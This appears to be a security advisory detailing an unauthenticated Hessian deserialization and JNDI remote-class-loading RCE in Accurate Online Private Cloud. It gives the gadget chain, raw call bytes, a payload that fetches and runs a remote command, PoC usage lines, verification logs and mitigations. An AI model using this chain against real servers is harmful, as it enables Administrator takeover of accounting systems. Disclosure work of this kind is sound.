# Accurate Online Private Cloud — Unauthenticated Hessian Deserialization → JNDI → Remote Class Loading → Administrator RCE

## 1. Overview

Accurate Online Private Cloud is the private-cloud / on-premises edition of Accurate Online, a localized accounting / ERP / financial-management SaaS platform from CPSSoft (Jakarta, Indonesia) — a mainstream financial-software choice for Indonesian SMBs. The 287MB `aolprivate.exe` InstallAnywhere installer ships an Excelsior JET AOT-compiled stack: Tomcat 9.0.31, Spring 4.3.8, Caucho Hessian 4.0.38, PostgreSQL 13, OpenVPN, and SAML SSO (spring-security-saml2-core 1.0.2 + OpenSAML 2.6.4). The server listens on 8765/tcp, and in the tested deployment Tomcat ran as Administrator (started via `catalina.bat run` as a scheduled task on Windows Server).

The business-application context `/accurate` sits behind a SAML SSO filter chain whose signature validation held up against every forgery variant tested. However, three Hessian RPC endpoints registered via Spring `HessianServiceExporter` — `/accurate/remote`, `/accurate/svc/data-exchange`, `/accurate/svc/accurate-maintenance` — are not covered by that filter chain and are reachable without authentication. `POST /accurate/remote` carrying a Hessian 1.0 invocation of `startAwsS3Emigrate` deserializes the attacker-supplied Map argument through `MapDeserializer`, triggering `HashMap.put` → `AbstractPointcutAdvisor.equals` → `AbstractBeanFactoryPointcutAdvisor.getAdvice` → `SimpleJndiBeanFactory.getBean` → `InitialContext.lookup` of an attacker-controlled LDAP URI. The embedded JVM is Excelsior JET 1.8.0_144 (< 8u191), where JNDI LDAP references may load classes from any codebase by default: the lookup retrieves an `Exploit.class` whose static initializer executes an arbitrary command. Verified end-to-end on a default installation — `whoami` returned `<host>\administrator` and a multi-step marker command executed fully (`RCE_CONFIRMED_20260731`, exit code 0).

At research time the product line had zero NVD CVE entries and essentially no public security-research coverage. The finding was produced by the full chain: unauthenticated-surface discovery → Hessian sink localization → parameter-type search → gadget/chain construction → dynamic verification.

## 2. Vulnerability Summary

- **Type**: Unauthenticated remote code execution — deserialization of untrusted data (CWE-502) on an endpoint missing authentication for a critical function (CWE-306)
- **Root cause 1 (CWE-306)**: the Hessian RPC endpoints under `/accurate` are registered through Spring `HessianServiceExporter`; their URL mappings are independent of the SAML filter chain, so the endpoints are reachable unauthenticated
- **Root cause 2 (CWE-502)**: `HessianSkeleton` deserializes each call argument using the method's declared parameter type as `expectedType`; a `Map` parameter routes the attacker-supplied Hessian map through `MapDeserializer.readMap` → `HashMap.put` → the `equals` gadget trigger
- **Root cause 3 (enabling condition)**: Spring 4.3.8 on the classpath supplies the `AbstractBeanFactoryPointcutAdvisor` JNDI gadget, and the Excelsior JET 1.8.0_144 JVM predates the 8u191 `trustURLCodebase` hardening, so the JNDI lookup performs unrestricted remote class loading
- **Result**: unauthenticated arbitrary command execution as Administrator. CVSS 9.8 — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

## 3. Product Architecture & Authentication Boundary

| Item | Value |
|------|-------|
| Vendor | CPSSoft (Jakarta, Indonesia) |
| Product | Accurate Online Private Cloud (private-cloud / on-premises edition of Accurate Online) |
| Distribution | 287MB InstallAnywhere installer (`aolprivate.exe`), public direct download |
| Runtime | Excelsior JET AOT-compiled Tomcat 9.0.31 + Spring 4.3.8 + Caucho Hessian 4.0.38 + PostgreSQL 13 + OpenVPN |
| SSO | spring-security-saml2-core 1.0.2 + OpenSAML 2.6.4 |
| Inbound port | 8765/tcp (Tomcat HTTP) |
| Deployment | Windows Server; Tomcat started via `catalina.bat run` (scheduled task) as Administrator |
| NVD CVEs at research time | 0 |

Key packaging trait: the web application is embedded inside the Excelsior JET native binary `aol-private.exe` (886MB, `MAINCLASS=Bootstrap`); the Tomcat `webapps/` directory stays permanently empty — the webapp resources are served from within the JET binary. Tomcat exposes two contexts:

- `/` (docBase `accurate-private`) — registration / login / management console (admin/admin set at registration)
- `/accurate` (docBase `accurate-app`) — the SAML SSO-protected business application

### 3.1 The strong side: the SAML SSO gate

Every top-level `/accurate/*` request is captured by the SAML filter; unauthenticated requests receive a 4893-byte AuthnRequest auto-submit form redirecting to the vendor IdP (`https://account.accurate.id/idp/sso`). Signature validation is mandatory and was probed with three forgery variants — unsigned assertion, self-signed assertion, and fully self-signed response — all rejected. The IdP signing certificate is embedded both in the JET binary and in the IdP metadata (`https://account.accurate.id/idp-metadata.xml`), and `AllowAllSignatureTrustEngine` trusts only the metadata-embedded certificate, so a self-generated certificate is rejected. Without the IdP private key, SAML assertion forgery is not feasible — the front door holds.

### 3.2 The weak side: unauthenticated endpoints behind the gate

The unauthenticated surface was enumerated by extracting memory strings from the running JET process (minidump via `rundll32 comsvcs.dll MiniDump`) plus dynamic probing. This recovered the CGLIB proxy method tables and confirmed the following `/accurate`-context endpoints that bypass the SAML filter:

| Endpoint | Type | Auth |
|----------|------|------|
| `/accurate/internal/running-process.do` | Diagnostics (HTML) | Unauthenticated |
| `/accurate/internal/running-process-data.do` | Diagnostics (JSON) | Unauthenticated |
| `/accurate/internal/thread-dump.do` | Diagnostics | Unauthenticated |
| `/accurate/monitoring` | JavaMelody 1.67.0 monitoring | Unauthenticated |
| **`/accurate/remote`** | **Hessian RPC (INucleusAppService)** | **Unauthenticated** ← target |
| `/accurate/svc/data-exchange` | Hessian RPC (IDataExchangeService) | Unauthenticated |
| `/accurate/svc/accurate-maintenance` | Hessian RPC (IAccurateMaintenanceService) | Unauthenticated |

The three Hessian services are registered via Spring `HessianServiceExporter`, and the exporter's URL mappings are independent of the SAML filter chain — the SAML gate does not cover them. That is the root of the vulnerability: a hardened SAML front door with an open internal RPC corridor running beside it.

## 4. Attack Surface Analysis

- **Entry**: unauthenticated `POST http://<host>:8765/accurate/remote` with a Hessian 1.0 body (`Content-Type: x-application/hessian`). The two sibling Hessian endpoints (`/accurate/svc/data-exchange`, `/accurate/svc/accurate-maintenance`) are exposed via the same mechanism; the PoC targets `/accurate/remote` because the recovered method tables identified a Map-parameter method on its service interface.
- **Controlled data**: the entire Hessian call — method name and every argument's serialized object graph.
- **Prerequisites**: none. Network reachability of 8765/tcp suffices (no cookie, token, or header requirement); default configuration, vulnerable as shipped.
- **Privilege**: Administrator — Tomcat process privileges (the product starts Tomcat as a scheduled task running `catalina.bat run` under Administrator).
- **Protocol**: Hessian 1.0 (`c` prefix); Spring HessianExporter auto-detects the protocol. `startAwsS3Emigrate` is registered on the INucleusAppService HessianSkeleton method map; arg1 declared type = `Map` → MapDeserializer → `equals` → JNDI; JVM 8u144 < 8u191 with `trustURLCodebase=true` → remote class loading unrestricted.
- **Ancillary unauthenticated surface**: process/thread diagnostics endpoints and JavaMelody monitoring under the same context.

## 5. Root-Cause Analysis

### 5.1 The Hessian deserialization sink

All three Hessian endpoints are handled by `HessianServiceExporter` (Spring 4.3.8) → `HessianSkeleton` (Caucho Hessian 4.0.38). The Hessian protocol lets the client send arbitrary serialized objects; the server deserializes each argument with `HessianInput.readObject(expectedType)`. If the expected type is `Map`/`HashMap`, deserialization goes through `MapDeserializer.readMap` → `HashMap.put` → an `equals`/`hashCode` trigger chain → the JNDI gadget.

### 5.2 Protocol auto-detection (decompiled Spring 4.3.8 `HessianExporter.doInvoke`)

```java
int code = is.read();
if (code == 'H' || code == 'C') {        // 72/67 -> Hessian 2.0
    in = new Hessian2Input(is);
} else if (code == 'c') {                  // 99 -> Hessian 1.0
    is.reset();
    in = new HessianInput(is);
} else {
    throw new Throwable("Expected 'H'/'C' (Hessian 2.0) or 'c' (Hessian 1.0)");
}
```

The gadget bytes begin with the `M` tag (0x4D, Hessian 1.0 map) and end with the `z` terminator (0x7A) — Hessian 1.0 format — so the attack call uses the `c\x01\x00` prefix to match.

### 5.3 HessianSkeleton dispatch (decompiled Caucho Hessian 4.0.38)

```java
public void invoke(InputStream is, OutputStream os) {
    HessianInput in = ...;
    in.skipOptionalCall();                 // skip the 'c' header
    while (in.readHeader() != null) ;      // skip headers
    String method = in.readMethod();       // read the method name
    int argLength = in.readMethodArgLength(); // HessianInput returns -1
    Method methodRef = getMethod(method + "__" + argLength);
    if (methodRef == null)
        methodRef = getMethod(method);     // fallback: look up by plain method name
    // ...
    for (int i = 0; i < args.length; i++) {
        values[i] = in.readObject(args[i]); // ← key: declared parameter type used as expectedType
    }
}
```

### 5.4 The parameter type decides the deserializer

```java
// HessianInput.readObject(Class cl), case 'M' (77):
Deserializer reader = factory.getDeserializer(cl); // cl = declared parameter type
return reader.readMap(this);
```

- Parameter type `Object` → `ObjectDeserializer` → `AbstractDeserializer.readMap` reads one object and throws "unexpected object" — JNDI is not triggered.
- Parameter type = concrete bean → `BeanDeserializer.readMap` populates field setters — no `HashMap.put`, no `equals` trigger.
- **Parameter type = `Map`/`HashMap`** → `MapDeserializer.readMap` → `new HashMap().put(...)` → **triggers `equals` → JNDI.**

### 5.5 The key breakthrough: finding a Map-parameter method

The gadget only fires if the invoked method declares a `Map` parameter. A scan of the CGLIB proxy method tables recovered from the process minidump yielded the `INucleusAppService` signature:

```java
startAwsS3Emigrate(ISharedApplicationDatabase arg0, Map arg1, String arg2, boolean arg3)
```

The second parameter is declared as `java.util.Map` — satisfying the `MapDeserializer` trigger condition.

## 6. Exploit Chain Construction

### 6.1 Gadget selection

The target classpath contains Spring 4.3.8, which supplies two viable gadgets: **SpringAbstractBeanFactoryPointcutAdvisor (714B) — chosen**, and SpringPartiallyComparableAdvisorHolder (1504B). The Rome gadget (867B) was excluded because Rome is not on the classpath. The chain:

```
MapDeserializer.readMap:114
  → HashMap.put
  → AbstractPointcutAdvisor.equals:74
  → AbstractBeanFactoryPointcutAdvisor.getAdvice:109
  → SimpleJndiBeanFactory.getBean:112
  → SimpleJndiBeanFactory.doGetSingleton:218
  → InitialContext.lookup(ldap://127.0.0.1:1389/Exploit)
```

### 6.2 Hessian 1.0 call bytes

```
c 01 00                          # Hessian 1.0 call header
m 00 12  startAwsS3Emigrate      # method name (len=18, 2-byte big-endian)
N                                # arg0 = null (ISharedApplicationDatabase)
<gadget bytes: 714B>             # arg1 = Map (Spring gadget, Hessian 1.0 map)
S 00 01  x                       # arg2 = "x" (String)
T                                # arg3 = true (boolean)
z                                # end
```

The 714B gadget (head `4d7400004d740041`) embeds `adviceBeanName = ldap://127.0.0.1:1389/Exploit` and `beanFactory = SimpleJndiBeanFactory`; the map tag `M` + `HashMap` + two `DefaultBeanFactoryPointcutAdvisor` entries collide inside `HashMap.put`, firing `equals` → `getAdvice` → `lookup`.

### 6.3 JNDI service side and remote payload

Both services are embedded in the PoC as pure Python:

- **LDAP :1389** — a hand-written BER/LDAP reference server; the searchRequest is answered with a `javaNamingReference`: `javaClassName=Exploit`, `javaCodeBase=http://127.0.0.1:8888/`, `javaFactory=Exploit`.
- **HTTP :8888** — an `http.server` delivering `Exploit.class` (2214B, Java 8 class version 52) and `cmd.txt` (the command).

`Exploit.class` static initializer: (1) opens `http://127.0.0.1:8888/cmd.txt` and reads the command; (2) `Runtime.getRuntime().exec(...)` with `{"cmd","/c",cmd}` on Windows or `{"/bin/sh","-c",cmd}` on Unix; (3) writes the output to `C:\Windows\Temp\aol_rce_out.txt` (Windows) or `/tmp/aol_rce_out.txt` (Unix).

### 6.4 Why remote class loading works

The target JVM is Excelsior JET 1.8.0_144 — below Oracle JDK 8u191. Before 8u191, `com.sun.jndi.ldap.object.trustURLCodebase` defaults to true, so a JNDI LDAP reference may load classes from any codebase. The embedded JVM predates the fix → unrestricted remote class loading → code execution. Full chain:

```
Unauthenticated POST /accurate/remote (Hessian 1.0, bypasses SAML filter)
  → HessianServiceExporter.doInvoke (protocol auto-detect: 'c' → Hessian 1.0)
  → HessianSkeleton.invoke → readObject(Map)  (startAwsS3Emigrate arg1)
  → MapDeserializer.readMap → HashMap.put
  → AbstractBeanFactoryPointcutAdvisor.equals → getAdvice
  → SimpleJndiBeanFactory.getBean → InitialContext.lookup(ldap://127.0.0.1:1389/Exploit)
  → LDAP ref → http://127.0.0.1:8888/Exploit.class  (JVM 8u144, trustURLCodebase=true)
  → Exploit.class static initializer → Runtime.exec(cmd)
  → RCE as Administrator (Tomcat process privileges)
```

## 7. PoC Usage

The PoC is `exploit/accurate_hessian_jndi_rce.py` — pure Python 3 standard library (socket / threading / http.server / base64), no third-party dependencies, no marshalsec/ldap3. It starts the LDAP reference server (:1389) and the HTTP payload server (:8888) in background threads, confirms both ports are listening, sends the Hessian 1.0 attack POST to `/accurate/remote`, waits for the JNDI callback + class load + command execution, and prints the server log:

```sh
python3 accurate_hessian_jndi_rce.py <target_host:8765> "<shell_command>"

python3 accurate_hessian_jndi_rce.py 127.0.0.1:8765 "whoami"
python3 accurate_hessian_jndi_rce.py 127.0.0.1:8765 "ver & set USERNAME & echo RCE_CONFIRMED"
```

Command output is written on the target to `C:\Windows\Temp\aol_rce_out.txt` (Windows) or `/tmp/aol_rce_out.txt` (Unix); retrieve it via the target's file-read primitive or direct host access and expect `USER: Administrator`, the command STDOUT, and `EXIT: 0`.

## 8. Verification Evidence

### 8.1 Attacker-side server log (PoC run)

```
[*] attack   : POST /accurate/remote, 745 B Hessian 1.0 body
[*] response : 168 B
[*] resp head:
    HTTP/1.1 200
    Content-Type: application/x-hessian
    Content-Language: id-ID

[ldap] bindRequest msgid=1 -> bindResponse success
[ldap] searchRequest msgid=2 -> JNDI ref (codebase=http://127.0.0.1:8888/, factory=Exploit)
[http] GET /Exploit.class
[http] -> serving Exploit.class (2214 B)
[http] GET /cmd.txt

[+] LDAP JNDI reference served -> remote class load triggered
```

HTTP 200 alone only proves the call was dispatched (RCE fires asynchronously through JNDI); the LDAP/HTTP callback log plus the target-side marker file prove execution.

### 8.2 Target-side evidence — `C:\Windows\Temp\aol_rce_out.txt`

Test 1 — `whoami`:

```
CMD: whoami
USER: Administrator
--- STDOUT ---
<host>\administrator
--- EXIT: 0 ---
```

Test 2 — multi-step command `ver & set USERNAME & echo RCE_CONFIRMED_20260731`:

```
CMD: ver & set USERNAME & echo RCE_CONFIRMED_20260731
USER: Administrator
--- STDOUT ---
Microsoft Windows [Version 10.0.26100.32690]
USERNAME=Administrator
RCE_CONFIRMED_20260731
--- EXIT: 0 ---
```

Both tests reproduced; the multi-step command executed in full — arbitrary command execution as Administrator is proven. (The Windows build banner is locale-localized; the host identifier in the whoami output is redacted.)

### 8.3 Catalina log confirms the full gadget chain even without a JNDI server

The first attack fired before the LDAP server was running; the product's `catalina` log recorded the complete stack trace:

```
MapDeserializer.readMap:114 → HashMap.put → AbstractPointcutAdvisor.equals:74
→ AbstractBeanFactoryPointcutAdvisor.getAdvice:109 → SimpleJndiBeanFactory.getBean:112
→ SimpleJndiBeanFactory.doGetSingleton:218 → InitialContext.lookup(ldap://127.0.0.1:1389/Exploit)
→ com.sun.jndi.ldap.LdapCtx.connect → ConnectException (LDAP not running)
```

This proves the deserialization → gadget → JNDI `lookup()` chain triggers regardless of the LDAP endpoint; adding the reference server completed the chain to code execution.

## 9. Security Impact

- **Full unauthenticated host takeover**: arbitrary command execution as Administrator on the Windows Server hosting the ERP — beyond the application's own data.
- **Financial data exposure**: the platform holds the organization's accounting/ERP and financial records; confidentiality, integrity (tampered books, fraud cover), and availability (ransomware, destructive commands) are all compromised.
- **No interaction or credentials required**: a single network-reachable POST to port 8765; default installations are vulnerable as shipped. The same SAML filter gap also exposes the data-exchange and maintenance Hessian services plus monitoring/diagnostics endpoints, which support reconnaissance. Deployments concentrate in Indonesian SMB finance departments — a segment with little security oversight, frequently reachable via forwarded ports or remote-access setups.
- **Foothold value**: Administrator-level RCE on the accounting server is a high-value pivot for lateral movement into the internal network.

## 10. Mitigation

1. **Upgrade the JVM** to 8u191+ (`trustURLCodebase=false` by default) or a current JDK 11/17. The single most effective change — it severs JNDI remote class loading. Note the product bundles Excelsior JET 1.8.0_144, so the vendor must rebuild and re-ship with a supported runtime.
2. **Require authentication on the Hessian endpoints**: bring `/accurate/remote` (and the two sibling endpoints) under the SAML filter chain or protect them with a dedicated authentication filter; unauthenticated internal RPC should not exist.
3. **Hessian deserialization allowlist**: restrict deserializable classes via the Hessian `SerializerFactory` deserializer configuration; block JNDI gadget classes such as `AbstractBeanFactoryPointcutAdvisor` and `SimpleJndiBeanFactory`.
4. **Remove/restrict JNDI**: disable `SimpleJndiBeanFactory` in the Spring configuration or replace it with local resource references.
5. **Upgrade Spring 4.3.8 / Hessian 4.0.38** to current releases and apply their deserialization hardening.

Defense in depth for administrators:

- Do not run Tomcat as Administrator; use a dedicated least-privilege service account.
- Do not bind 8765/tcp on `0.0.0.0`; bind to loopback or an internal address and restrict with a firewall.
- Do not expose Hessian RPC endpoints in the same context as the SAML-protected business application — isolate them or enforce independent authentication.
